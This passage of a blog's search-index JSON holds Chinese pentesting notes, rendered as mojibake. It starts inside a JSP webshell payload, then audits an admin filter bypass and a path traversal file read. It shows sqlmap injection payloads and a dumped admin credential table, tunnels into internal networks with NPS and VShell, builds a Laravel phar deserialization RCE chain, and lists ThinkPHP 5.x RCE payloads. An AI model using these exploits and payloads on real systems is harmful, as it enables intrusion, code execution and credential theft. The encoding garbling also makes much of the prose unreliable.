f=((Class)session.getAttribute(payload)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16)); catch (Exception e)%------WebKitFormBoundary2WnYeHXgLweiQ8gE-- æˆåŠŸè¿æ¥ è¿‡æ»¤å™¨ç»•è¿‡ä»–çš„ç”¨é€” admin*è·¯å¾„çš„è¯·æ±‚ï¼ˆæ¯”å¦‚adminuserã€adminorderç­‰ï¼‰ï¼Œæ£€æŸ¥ç”¨æˆ·æ˜¯å¦å·²ç™»å½•ä¸ºç®¡ç†å‘˜ï¼›æœªç™»å½•åˆ™å¼ºåˆ¶è·³è½¬åˆ°ç™»å½•é¡µï¼Œå·²ç™»å½•åˆ™å…è®¸è®¿é—®ç›®æ ‡èµ„æº è¿™é‡Œä»£ç ç”¨äº†è¿‡æ»¤å™¨filter å®ƒæ˜¯è¿è¡Œåœ¨æœåŠ¡å™¨ä¹‹å‰çš„@WebFilter(filterName=adminPermissionFilter,urlPatterns= /admin/*)public class AdminPermissionFilter implements Filter //log4j2 protected Logger logger = LogManager.getLogger(AdminPermissionFilter.class); @Override public void init(FilterConfig filterConfig) @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException HttpServletRequest servletRequest = (HttpServletRequest) request; //å¦‚æœæ˜¯(ç™»å½•ç•Œé¢,ç™»å½•æ€å¤±æ•ˆç•Œé¢)ï¼Œç›´æ¥æ”¾è¡Œ if(servletRequest.getRequestURI().contains(/admin/login) || servletRequest.getRequestURI().contains(/admin/account) ) chain.doFilter(request, response); else logger.info(æ£€æŸ¥ç®¡ç†å‘˜æƒé™); Object o = servletRequest.getSession().getAttribute(adminId); if(o == null) logger.info(æ— ç®¡ç†æƒé™ï¼Œè¿”å›ç®¡ç†å‘˜ç™»é™†é¡µ); request.getRequestDispatcher(/admin/login).forward(request, response); else logger.info(æƒé™éªŒè¯æˆåŠŸï¼Œç®¡ç†å‘˜IDï¼š,o); chain.doFilter(request, response); @Override public void destroy() ä½†æ˜¯æ³¨æ„åˆ°æ²¡ï¼Œå¦‚æœæˆ‘ä»¬æ˜¯adminlogin....tmalladminuploadAdminHeadImage å°±å¯ä»¥ç»•è¿‡é€»è¾‘ç›´æ¥æ”¾è¡Œ å› ä¸ºä»–åªåˆ¤æ–­å‰é¢æœ‰æ²¡æœ‰è¿™ä¸ªadminlogin æˆ–è€… admiiinaccount æ¡ˆä¾‹ä¸‰ï¼šOA-sys æ–‡ä»¶ä»»æ„è¯»å–æœç´¢ new FileInputStream( æ‰¾åˆ° srcmainjavacngsonoasyscontrolleruserUserpanelController.java @RequestMapping(image/**)public void image(Model model, HttpServletResponse response, @SessionAttribute(userId) Long userId, HttpServletRequest request) throws Exception String projectPath = ClassUtils.getDefaultClassLoader().getResource().getPath(); System.out.println(projectPath); String startpath = new String(URLDecoder.decode(request.getRequestURI(), utf-8)); String path = startpath.replace(/image, ); System.out.println(path); File f = new File(rootpath, path); System.out.println(rootpath); ServletOutputStream sos = response.getOutputStream(); FileInputStream input = new FileInputStream(f.getPath()); byte[] data = new byte[(int) f.length()]; IOUtils.readFully(input, data); // å°†æ–‡ä»¶æµè¾“å‡ºåˆ°æµè§ˆå™¨ IOUtils.write(data, sos); input.close(); sos.close(); ä»£ç å¾ˆç®€å•ä¼ å…¥imageåé¢çš„æŠŠ imageæ›¿æ¢ä¸ºç©ºç„¶åè¯»å–æ•°æ®æ‰“å°åˆ°æµè§ˆå™¨ imageimage..image..image..image..image..image..1.txt é‚£å°±æ˜¯è¿™æ · ä½†æ˜¯ä½ æƒ³å•Š æˆ‘ç›´æ¥è¾“å…¥image............1.txt å¯ä»¥å— ä¸å¯ä»¥ å› ä¸º..ç›´æ¥å°±æŠŠ imageç»™å»æ‰äº† éƒ½æ‰¾ä¸åˆ°æ¥å£ä½ç½®äº† ç›´æ¥å°±å˜æˆäº† www.xxx.com/1.txt","tags":["JavaEE"]},{"title":"JavaEEä»£ç å®¡è®¡-sqlæ³¨å…¥","path":"/2025/10/21/posts/code1javaee/","content":"JavaEEä»£ç å®¡è®¡-sqlæ³¨å…¥ sqlæ³¨å…¥æ‰¾åˆ°ä¸å®‰å…¨çš„ä»£ç ç„¶åæ‰¾åˆ°å®é™…æ³¨å…¥ç‚¹ 1ï¼šå®‰å…¨ä¸ä¸å®‰å…¨JDBC PreparedStatement å®‰å…¨å†™æ³•(é¢„ç¼–è¯‘)ï¼š select * from admin where id=? ä¸å®‰å…¨å†™æ³•(æ‹¼æ¥)ï¼š select * from admin where id=+id 2ï¼šHibernate Hibernateã€JPAé»˜è®¤æ˜¯ç»è¿‡é¢„ç¼–è¯‘çš„ï¼Œä½†æ˜¯å¦‚æœå¼€å‘è‡ªå·±ç¼–å†™çš„SQLè¯­å¥ï¼Œä¹Ÿéœ€è¦è¿›è¡Œæ£€æŸ¥ï¼›Javaæ˜¯å¼ºç±»å‹è¯­è¨€ï¼Œå½“æ³¨å…¥å‚æ•°ä¸ºlongã€intç­‰æ•°å­—ç±»å‹æ—¶æ— æ³•è¿›è¡Œæ³¨å…¥ï¼›æ‰¾åˆ°å±é™©å‡½æ•°ä½ç½®ä¹‹åï¼Œå‘ä¸Šæœç´¢ï¼Œæ‰¾å‡½æ•°ã€æ–¹æ³•è°ƒç”¨ä½ç½®ï¼Œç›´åˆ°è¯·æ±‚å…¥å£ï¼ˆcontrollerå±‚ï¼‰ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ— å®³åŒ–å¤„ç†ã€æ— å®³åŒ–å¤„ç†æ˜¯å¦ä¸¥æ ¼ï¼›å‚è€ƒï¼šhttps://mp.weixin.qq.com/s/9t3t6qxosGsKiXMIRtMoPw å®‰å…¨å†™æ³•ï¼šString hql = FROM User WHERE username=:username; ä¸å®‰å…¨å†™æ³•ï¼šString hql = FROM User WHERE username=+username+; 3ï¼šMyBatis 1ã€å®‰å…¨å†™æ³•ï¼š select * from admin where id = #id 2ã€ä¸å®‰å…¨å†™æ³•ï¼šselect * from admin where id = $idé¢„ç¼–è¯‘å¯¹äºorder by ,like æ’åºä¸èƒ½ä½¿ç”¨# è¦ç”¨åˆ°ç¾å…ƒç¬¦å·ç›¸å…³æœç´¢å…³é”®å­—ï¼šStatementcreateStatementPrepareStatementlike %$in($in ($selectupdateinsertdelete$order bysetObject(setInt(setString(setSQLXML(createQuery(createSQLQuery(createNativeQuery æ¡ˆä¾‹ä¸€ï¼š jfinal_cms-4.5.0æ­å»ºé€‰æ‹©java1.8 maven clean - compile ç¼–è¯‘å æ‰“åŒ… - é…ç½®æ•°æ®åº“æ–‡ä»¶å¯†ç åœ¨srcmainresourcesconfdb.properties - å¼€å¯tomcaté…ç½®ä¸‹ ä½ å¯ä»¥è¿è¡ŒwaråŒ…åœ¨tomcatä¸‹ä¹Ÿå¯ä»¥è‡ªå·±è¿è¡Œ é…ç½®å¥½åè¿è¡Œ é¦–å…ˆjdbcæ˜¯ç‰¹å®šçš„ æœä¸åˆ°å…¶ä»–çš„æ¡†æ¶é‚£å¤§å·®ä¸å·®å°±æ˜¯JDBCäº† æœå…³é”®å­—order by è¿™é‡Œç”¨äº†order by æ²¡æœ‰å‘ç°é¢„ç¼–è¯‘çš„å‡½æ•°è°ƒç”¨æŸ¥çœ‹æ•°å€¼å“ªé‡Œæ¥çš„ public void list() TbAdviceFeedback model = getModelByAttr(TbAdviceFeedback.class); SQLUtils sql = new SQLUtils( from tb_advice_feedback t where 1=1 ); if (model.getAttrValues().length != 0) sql.setAlias(t); // æŸ¥è¯¢æ¡ä»¶ sql.whereLike(username, model.getStr(username)); sql.whereLike(qq, model.getStr(qq)); sql.whereLike(email, model.getStr(email)); sql.whereLike(telphone, model.getStr(telphone)); // æ’åº String orderBy = getBaseForm().getOrderBy(); if (StrUtils.isEmpty(orderBy)) sql.append( order by t.id desc ); else sql.append( order by ).append(orderBy); public String getOrderBy() return StrUtils.isEmpty(this.getOrderColumn()) ? : + this.getOrderColumn() + + this.getOrderAsc() + ; å‡è®¾å‰ç«¯ç”¨æˆ·é€šè¿‡è¯·æ±‚å‚æ•°ä¼ å…¥ form.orderColumn=id å’Œ form.orderAsc=descï¼Œé‚£ä¹ˆ getOrderBy() ä¼šè¿”å› id desc ï¼› è¯­æ³•å˜ä¸ºfrom tb_advice_feedback t where 11 â€¦ order by idâ€™ desc attr.username å­˜åœ¨æ³¨å…¥ï¼Œè¿™å’Œ order by æ³¨å…¥æ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„æ¼æ´ç‚¹ï¼Œä½†æ ¹æºç›¸åŒï¼šç”¨æˆ·è¾“å…¥æœªç»è¿‡æ»¤ç›´æ¥æ‹¼æ¥ SQLã€‚ sql.whereLike(â€œusernameâ€, model.getStr(â€œusernameâ€)); where 11 and t.username like â€˜%â€™ AND 53565356#%â€™ æ³¨å…¥ç‚¹ POST /jfinal_cms_war/admin/advicefeedback/list HTTP/1.1Host: 192.168.56.1:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3Accept-Encoding: gzip, deflate, brContent-Type: application/x-www-form-urlencodedContent-Length: 162Referer: http://192.168.56.1:8080/jfinal_cms_war/admin/advicefeedback/listCookie: JSESSIONID=D0DB3D39361956B38E1192899D19AC9C; Hm_lvt_1040d081eea13b44d84a4af639640d51=1761037584; Hm_lpvt_1040d081eea13b44d84a4af639640d51=1761037596; HMACCOUNT=3EB8BB477261F100; session_user=adbwppgits7xZtBvvuZUfHpWYwIQiPcc8kemwIa9b1Q=Connection: keep-aliveUpgrade-Insecure-Requests: 1form.orderColumn=form.orderAsc=form.orderColumn=form.orderAsc==attr.qq=attr.email=attr.telphone=totalRecords=6pageNo=1pageSize=20length=10sqlmap--------------------------POST parameter attr.username is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection point(s) with a total of 390 HTTP(s) requests:---Parameter: attr.username (POST) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment) Payload: form.orderColumn=form.orderAsc=form.orderColumn=form.orderAsc=attr.username= AND 5356=5356#attr.qq=attr.email=attr.telphone=totalRecords=6pageNo=1pageSize=20length=10 Type: error-based Title: MySQL = 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET) Payload: form.orderColumn=form.orderAsc=form.orderColumn=form.orderAsc=attr.username= AND GTID_SUBSET(CONCAT(0x7171627171,(SELECT (ELT(6916=6916,1))),0x7171767871),6916)-- pTEUattr.qq=attr.email=attr.telphone=totalRecords=6pageNo=1pageSize=20length=10 Type: time-based blind Title: MySQL = 5.0.12 AND time-based blind (query SLEEP) Payload: form.orderColumn=form.orderAsc=form.orderColumn=form.orderAsc=attr.username= AND (SELECT 7418 FROM (SELECT(SLEEP(5)))CwkB)-- OkYGattr.qq=attr.email=attr.telphone=totalRecords=6pageNo=1pageSize=20length=10---[17:12:43] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL = 5.6[17:12:43] [INFO] fetched data logged to text files under C:\\Users\\22118\\AppData\\Local\\sqlmap\\output\\192.168.56.1[17:12:43] [WARNING] your sqlmap version is outdated çˆ†ç ´å‡ºä¿¡æ¯ Database: jfinal_cmsTable: sys_user[2 entries]+--------+--------------------------+----------+| userid | password | username |+--------+--------------------------+----------+| 1 | 1RHFCLt64uOOViCTzgSaww== | admin || 2 | ldKI9edsQVM= | testapi |+--------+--------------------------+----------+[17:20:27] [INFO] table jfinal_cms.sys_user dumped to CSV file C:\\Users\\22118\\AppData\\Local\\sqlmap\\output\\192.168.56.1\\dump\\jfinal_cms\\sys_user.csv[17:20:27] [INFO] fetched data logged to text files under C:\\Users\\22118\\AppData\\Local\\sqlmap\\output\\192.168.56.1[17:20:27] [WARNING] your sqlmap version is outdated[*] ending @ 17:20:27 /2025-10-21/E:\\safaapp\\SQLMAPE:\\safaapp\\SQLMAPpython sqlmap.py -r 1.txt -D jfinal_cms -T sys_user -C userid,username,password --dump order byè¿™ç§ä¸èƒ½é¢„ç¼–è¯‘å› ä¸ºä»–ä»¬æ˜¯sqlè¯­å¥ä¸€éƒ¨åˆ† ä¸æ˜¯æ•°å€¼ ä¿®å¤ order by æ’åºæ³¨å…¥ï¼ˆæ ¸å¿ƒï¼šç™½åå•æ ¡éªŒï¼‰é™åˆ¶æ’åºæ–¹å‘ï¼ˆasc/descï¼‰ æ’åºæ–¹å‘åªèƒ½æ˜¯ ascï¼ˆå‡åºï¼‰æˆ– descï¼ˆé™åºï¼‰ï¼Œå…¶ä»–å€¼å‡è§†ä¸ºéæ³• æ¡ˆä¾‹äºŒï¼š oa_system-masterå‘ç°mybatisæœç´¢ä¸å®‰å…¨å†™æ³• æ‰¾åˆ°controllerç±» @RequestMapping(/)@RequestMapping(informlistpaging)\tpublic String informListPaging(@RequestParam(value = pageNum, defaultValue = 1) int page, @RequestParam(value = baseKey, required = false) String baseKey, @RequestParam(value=type,required=false) Integer type, @RequestParam(value=status,required=false) Integer status, @RequestParam(value=time,required=false) Integer time, @RequestParam(value=icon,required=false) String icon, @SessionAttribute(userId) Long userId, Model model,HttpServletRequest req) System.out.println(baseKey:+baseKey); System.out.println(page:+page); setSomething(baseKey, type, status, time, icon, model); PageHelper.startPage(page, 10); ListMapString, Object list=nm.sortMyNotice(userId, baseKey, type, status, time); PageInfoMapString, Object pageinfo=new PageInfoMapString, Object(list); ListMapString, Object list2=informRelationService.setList(list); for (MapString, Object map : list2) System.out.println(map); model.addAttribute(url, informlistpaging); model.addAttribute(list, list2); model.addAttribute(page, pageinfo);\treturn inform/informlistpaging; å‘é€è¿™ä¸ªbasekeyç›´æ¥ä¼ å…¥è¿›æ¥çš„è·¯ç”±åœ¨æ ¹ç›®å½• sqlmap identified the following injection point(s) with a total of 81 HTTP(s) requests:---Parameter: baseKey (GET) Type: time-based blind Title: MySQL = 5.0.12 AND time-based blind (query SLEEP) Payload: baseKey=1 AND (SELECT 4561 FROM (SELECT(SLEEP(5)))sLqI) AND mrnl=mrnl---[17:47:53] [INFO] the back-end DBMS is MySQL[17:47:53] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptionsback-end DBMS: MySQL = 5.0.12[17:47:53] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 44 times[17:47:53] [INFO] fetched data logged to text files under C:\\Users\\22118\\AppData\\Local\\sqlmap\\output\\localhost[17:47:53] [WARNING] your sqlmap version is outdated[*] ending @ 17:47:53 /2025-10-21/ è¿™é‡Œæ˜¯çœ‹åˆ°mybatisæœç´¢ä¸å®‰å…¨å†™æ³• è¿›å»å‘ç°å®ç°é‡Œé¢æ²¡æœ‰è¿‡æ»¤è€Œä¸”ç›´æ¥ä¼ å…¥æ•°å€¼è¿›è€Œæ³¨å…¥ and n.title LIKE â€˜%1â€™ AND (SELECT â€¦ SLEEP(5) â€¦) AND â€˜mrnlâ€™â€™mrnl%â€™ sqlmapæ³¨å…¥","tags":["JavaEE"]},{"title":"NPS-å†…ç½‘æ”»é˜²ä¿¡æ¯æ‰“ç‚¹å·¥å…·","path":"/2025/10/21/posts/nps/","content":"NPS-å†…ç½‘æ”»é˜²ä¿¡æ¯æ‰“ç‚¹å·¥å…· å®ç°ç›®æ ‡-é€šè¿‡æœ¬æœºè®¿é—®åˆ«äººçš„localhost3306æ•°æ®åº“ æœ¬åœ°å¯åŠ¨npsæœåŠ¡ç«¯ é»˜è®¤æ‰“å¼€8080ç«¯å£webæœåŠ¡ è´¦å·adminå¯†ç 123 å¯ä»¥åœ¨confé‡Œé¢ä¿®æ”¹å¯†ç  ç™»å½•ååˆ›å»ºä¸€ä¸ªå®¢æˆ·ç«¯å¤åˆ¶è¿æ¥å£ä»¤ æŠŠä¸‹é¢å‘½ä»¤å¤åˆ¶ç»™å®¢æˆ·ç«¯çš„ä¸€å°è·³æ¿ä¸»æœº è¿è¡Œåˆ·æ–°è¿æ¥å˜æˆäº†å°±ç»ªæˆ‘ä»¬ç‚¹å‡»éš§é“åˆ›å»ºä¸€ä¸ªæœ¬åœ°çš„6666å°±æ˜¯å¯¹åº”å¯¹æ–¹IPçš„3306 å¯¹åº”æ•°æ®åº“æœåŠ¡ è®¿é—®æŸ¥çœ‹å‘ç°å¯ä»¥ç›´æ¥è¿æ¥ åç»­ä½¿ç”¨Socketå»ºç«‹ä¸€ä¸ªèŠ‚ç‚¹ä¹Ÿå¯ä»¥ å®ç°ç›®æ ‡é€šè¿‡sockså»ºç«‹èŠ‚ç‚¹æ‰“é€šå†…ç½‘å…ˆå®‰è£…ä»£ç†å·¥å…·linux # Debian/Ubuntusudo apt-get install proxychains# CentOS/RHELsudo yum install proxychains-ngå¦‚æœæ˜¯windows ç”¨proxfierè¿™é‡Œnpsç”¨çš„socks5ä½¿ç”¨# æ³¨é‡Šæ‰åŸæœ‰ç¤ºä¾‹ï¼Œæ·»åŠ ä½ çš„ä»£ç†/etc/proxychains.conf æ–‡ä»¶è®¾ç½®socks5 127.0.0.1 1080 # SOCKS5 ä»£ç†# http 127.0.0.1 8080 # HTTP ä»£ç†ï¼ˆæ ¹æ®éœ€è¦é€‰æ‹©ï¼‰ è®¾ç½®é€šè¿‡socksæœ¬èº«9999ç«¯å£ NPSè®¾ç½®ç•Œé¢ä¸º9999å’Œæœ¬åœ°å»åˆ ä½¿ç”¨proxychains4 curl xx ä»£ç†æ¥è¿è¡Œ ä¸è¦ç›´æ¥è¿è¡Œå¯ä»¥çœ‹åˆ°æˆåŠŸè®¿é—®æˆ‘ä»¬çš„å†…ç½‘ ä¸Šé¢æ˜¯æ²¡ç”¨çš„è®¿é—®ä¸åˆ° npsæ”¹é»˜è®¤å¯†ç  ä¿®æ”¹ nps.conf æ–‡ä»¶æŠŠé»˜è®¤å¯†ç 123ä¿®æ”¹å³å¯ å†…ç½‘ä¸å‡ºç½‘ç»œçš„é€šè¿‡NPSè½¬å‘ç«¯å£å®ç°é¦–å…ˆç½‘æ®µæ˜¯å†…ç½‘192.168.22.131 è¢«æ‹¿shellè·³æ¿æœº 192.168.22.130 mysqlæœåŠ¡æœºå™¨ æœ¬åœ°ä¸èƒ½è®¿é—®192.168.22.0ç½‘æ®µ ping 192.168.22.130æ­£åœ¨ Ping 192.168.22.130 å…·æœ‰ 32 å­—èŠ‚çš„æ•°æ®:è¯·æ±‚è¶…æ—¶ã€‚ é¦–å…ˆè¿æ¥npså’Œä¸Šé¢ä¸€æ · è¿™é‡Œè½¬å‘ç«¯å£è®¾ç½®æ˜¯æˆ‘ä»¬è¦çš„å†…ç½‘ç«¯å£å®ƒä¼šè‡ªåŠ¨å§å½“å‰å®¢æˆ·ç«¯å½“æˆè·³æ¿ ç„¶åæˆ‘ä»¬æœ¬åœ°é€šè¿‡VPSæ¥ç™»å½•æµ‹è¯• å¯ä»¥å‘ç°ä¸èƒ½è¿æ¥çš„ä¹Ÿå¯ä»¥è½¬å‘äº† mysql -h 116.62.32.64 -P 33306 -u root -prootmysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 32Server version: 5.5.5-10.6.7-MariaDB-3 Debian buildd-unstableCopyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type help; or \\h for help. Type \\c to clear the current input statement.mysqlmysqlmysql show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || sys |+--------------------+4 rows in set (0.12 sec)mysqlvpsä¸Šé¢æµ‹è¯• vpsè¦ç”¨127.0.0.1 TCPçš„mysql -P 33306 -u root -prootERROR 1045 (28000): Access denied for user root@localhost (using password: YES)[root@iZbp156z1grx9b9s1305p0Z ~]# mysql -h localhost -P 33306 -u root -prootERROR 1045 (28000): Access denied for user root@localhost (using password: YES)[root@iZbp156z1grx9b9s1305p0Z ~]# mysql -h localhost -P 33306 -u root -pEnter password: ERROR 1045 (28000): Access denied for user root@localhost (using password: YES)[root@iZbp156z1grx9b9s1305p0Z ~]# mysql -h 127.0.0.1 -P 33306 -u root -prootshowWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 33Server version: 10.6.7-MariaDB-3 Debian buildd-unstableCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type help; or \\h for help. Type \\c to clear the current input statement.MariaDB [(none)] show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || sys |+--------------------+4 rows in set (0.09 sec)MariaDB [(none)] å®ç°é€šè¿‡VSHELLå¹³å°è®¾ç½®ç«¯å£æ˜ å°„é€šè¿‡vshellè½¬å‘å†…ç½‘ç«¯å£é€šè¿‡è·³æ¿ä¸Šçº¿äº†åè½¬å‘å³å¯ C:\\Users\\22118mysql -h 127.0.0.1 -P 33066 -u root -pEnter password: ****Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 34Server version: 5.5.5-10.6.7-MariaDB-3 Debian buildd-unstableCopyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type help; or \\h for help. Type \\c to clear the current input statement.mysql show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || sys |+--------------------+4 rows in set (0.00 sec)mysql åŸºäºç«¯å£è½¬å‘æŠ€æœ¯æŒ‚è½½åœ¨å…¬ç½‘å®ç°éšè—çœŸå®IPåªæœ‰è½¬å‘æœåŠ¡å™¨IP æŠŠ8084è½¬å‘åˆ°å†…ç½‘çš„8084å¹²åˆ°äº†å…¬ç½‘ä¸Š","tags":["nps"]},{"title":"PHP11-Laravel-ä»£ç å®¡è®¡","path":"/2025/10/19/posts/code13phpmvc/","content":"PHPä»£ç å®¡è®¡11-Laravel-ä»£ç å®¡è®¡ å…ˆåˆ¤æ–­æ¡†æ¶æ‰¾åˆ°å…·ä½“ç‰ˆæœ¬å’Œæ¼æ´æ‰¾ä¸å®‰å…¨å±é™©æˆ–è€…è‡ªå·±æŒ–0day æ¡ˆä¾‹ä¸€ï¼š ModStartCMSPHPStudyå®‰è£…ModStart | ModStartå¼€å‘æ–‡æ¡£ [phpstudyå¯åŠ¨æŠ¥é”™nginx: emerg] invalid number of arguments in â€œincludeâ€ directive in çš„è§£å†³æ–¹æ³• - å­™çªå³¥ - æ¯”èŠ±è¨€å·§è¯­æ›´éš¾çš„æ˜¯å­¦ä¼šé—­å˜´ always_populate_raw_post_data -1 php.iniæ‰“å¼€è¿™ä¸ª å®‰è£…æŒ‰ç…§ä¸Šé¢çš„å®‰è£… ç›´æ¥åˆ©ç”¨å·¥å…·æ¢æµ‹ å¾—åˆ°ç‰ˆæœ¬æ˜¯â€laravelframeworkâ€: â€œ5.1.*â€, å†æ‰¾POC æ‰¾åˆ°å¯æ§å˜é‡ æˆ–è€…å¯æ§æ–‡ä»¶å‡½æ•°ä¸Šä¼ pharæ–‡ä»¶æµ‹è¯• https://xz.aliyun.com/news/10770 æˆ‘ä»¬æœç´¢unserializeæœç´¢æœ¬èº«çš„ä»–å†™çš„é‡Œé¢æœç´¢ä¸è¦å»æ¡†æ¶é‡Œé¢æœç´¢äº†,å¦‚æœæœ‰æ—©å‡ºCVEäº† å‘ç°æ²¡æœ‰æˆ‘ä»¬å°±æœç´¢å…³äºpharçš„æ–‡ä»¶æ“ä½œå‡½æ•° æœç´¢åˆ° vendormodstartmodstartsrcCoreUtilFileUtil.php public static function savePathToLocalTemp($path, $ext = null, $downloadStream = false) if (@file_exists($path)) return realpath($path); è¿™é‡Œæœ‰æ–‡ä»¶å‘½ä»¤æœç´¢ç”¨æ³•æ‰¾åˆ°äº† MemberApiControllerMemberProfileController.php default: $avatar = FileUtil::savePathToLocalTemp($avatar); if (empty($avatar)) return Response::generate(-1, è¯»å–å¤´åƒæ–‡ä»¶å¤±è´¥:-1); æˆ‘ä»¬å°±æ‰¾åœ¨è¿™ä¸ªavatarå¯ä¸å¯æ§ å‘ç°æ˜¯å¯æ§ $input-getTrimString(avatar) ä¸­çš„ avatar å¯¹åº” $this-data[$key]ï¼Œè€Œ $this-data é€šå¸¸æ˜¯ç”¨æˆ·æäº¤çš„è¯·æ±‚æ•°æ®ï¼ˆæ¯”å¦‚ POSTGET è¡¨å•ä¸­çš„ avatar å‚æ•°ï¼‰ã€‚ $avatar = $input-getTrimString(avatar); public function getTrimString($key, $defaultValue = ) if (isset($this-data[$key])) $value = @trim((string)$this-data[$key]); $value = StrUtil::filterSpecialChars($value); if ($value) return $value; return $defaultValue; ä½†æ˜¯æˆ‘ä»¬æ‹¿åˆ°POCæ˜¯ååºåˆ—åŒ–çš„æˆ‘ä»¬éœ€è¦çš„æ˜¯pharçš„æ–‡ä»¶å’‹åŠå‘¢ é—®ai ä¸æ˜¯ç”Ÿæˆpharçš„ä»£ç ?phpnamespace Illuminate\\Database;class DatabaseManager protected $extensions = array(); protected $app=array(); public function __construct() $this-extensions[calc.exe]=call_user_func; $this-app[config][database.connections]=[calc.exe=system]; $this-app[config][database.default] = calc.exe; namespace Illuminate\\View;use Illuminate\\Database\\DatabaseManager;class View protected $factory; public function __construct() $this-factory=new DatabaseManager; namespace Symfony\\Component\\Process\\Pipes;use Illuminate\\View\\View;class WindowsPipes private $files = array(); public function __construct() $this-files = array(new View()); echo urlencode(serialize(new WindowsPipes()));? phar.readonly Off Inié‡Œé¢æ‰“å¼€è¿™ä¸ªé‡å¯ç½‘é¡µæ‰“å¼€ ?phpnamespace Illuminate\\Database;class DatabaseManager protected $extensions = array(); protected $app=array(); public function __construct() $this-extensions[calc.exe]=call_user_func; $this-app[config][database.connections]=[calc.exe=system]; $this-app[config][database.default] = calc.exe; namespace Illuminate\\View;use Illuminate\\Database\\DatabaseManager;class View protected $factory; public function __construct() $this-factory=new DatabaseManager; namespace Symfony\\Component\\Process\\Pipes;use Illuminate\\View\\View;use Phar;class WindowsPipes private $files = array(); public function __construct() $this-files = array(new View()); //echo urlencode(serialize(new WindowsPipes()));$exp=new WindowsPipes();//echo base64_encode(serialize($exp));@unlink(laravel5_exp.phar);$phar = new Phar(laravel5_exp.phar); //åç¼€åå¿…é¡»ä¸ºphar$phar-startBuffering();$phar-setStub(GIF89a?php __HALT_COMPILER(); ?); //è®¾ç½®stub$phar-setMetadata($exp); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest$phar-addFromString(test.txt, test); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶//ç­¾åè‡ªåŠ¨è®¡ç®—$phar-stopBuffering();? æ‰¾åˆ°è·¯å¾„member_profileavatar) ä½†æ˜¯å› ä¸ºä¸Šä¼ è¿‡å»çš„æ—¶å€™ä»–ä¼šä¿®æ”¹é‡Œé¢çš„ä»£ç æ‰€ä»¥æˆ‘ä»¬è¦æ‰¾ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹ htmlhead meta charset=UTF-8 titleæ–‡ä»¶ä¸Šä¼ è¡¨å•/title/headbodyh1æ–‡ä»¶ä¸Šä¼ /h1form action=http://localhost:928/member_data/file_manager/file?action=uploadDirect method=post enctype=multipart/form-data label for=fileé€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶:/label input type=file name=file id=file brbr input type=submit value=ä¸Šä¼ æ–‡ä»¶/form/body/html å…ˆæŠ“åŒ…åæŠŠtypeä¸ä¸ºåŸæ¥æ•°å€¼ èµ°defaultçš„ è¿™ä¸ªé“¾æ¡RCE2 å‰é¢è¿˜æœ‰ä¸€ä¸ªTPä¸€æ ·çš„ä»»æ„æ–‡ä»¶åˆ é™¤åœ¨ https://starrui777.github.io/posts/code7phpmvc/ WindowsPipes#__destruct-removeFiles()-file_exists() -View#__toString-render()-renderContents() -DatabaseManager#__call-call_user_func_array#connection() å°±æ˜¯è§¦å‘tostringåè·³åˆ° view.php é‡Œé¢new DatabaseManager å› ä¸ºdatabaseé‡Œé¢æ²¡æœ‰ç±»ä¼šè§¦å‘ databasesé‡Œé¢çš„callæ–¹æ³•å°±å¯ä»¥RCEäº†","tags":["php"]},{"title":"PHP10-thinkphp-RCE","path":"/2025/10/18/posts/code12phpmvc/","content":"PHPä»£ç å®¡è®¡10-thinkphp-RCE **5.0.7=ThinkPHP5=5.0.22** ã€**5.1.0=ThinkPHP=5.1.30** æ¡ˆä¾‹ä¸€ï¼šRCE5.0-5.1 å·¥å…·ç§’æ€ 5.0.7ThinkPHP55.0.22 ã€5.1.0ThinkPHP5.1.30 ç›´æ¥åˆ©ç”¨å·¥å…·æ¢æµ‹ å…·ä½“payload 5.1 ?s=index/\\think\\Request/inputfilter[]=systemdata=pwd?s=index/\\think\\view\\driver\\Php/displaycontent=?php phpinfo();??s=index/\\think\\template\\driver\\file/writecacheFile=shell.phpcontent=?php phpinfo();? å†™å…¥æ–‡ä»¶?s=index/\\think\\Container/invokefunctionfunction=call_user_func_arrayvars[0]=systemvars[1][]=id?s=index/\\think\\app/invokefunctionfunction=call_user_func_arrayvars[0]=systemvars[1][]=id 5.0 ?s=index/think\\config/getname=database.username # è·å–é…ç½®ä¿¡æ¯?s=index/\\think\\Lang/loadfile=../../test.jpg # åŒ…å«ä»»æ„æ–‡ä»¶?s=index/\\think\\Config/loadfile=../../t.php # åŒ…å«ä»»æ„.phpæ–‡ä»¶?s=index/\\think\\app/invokefunctionfunction=call_user_func_arrayvars[0]=systemvars[1][]=id call_user_func å’Œ 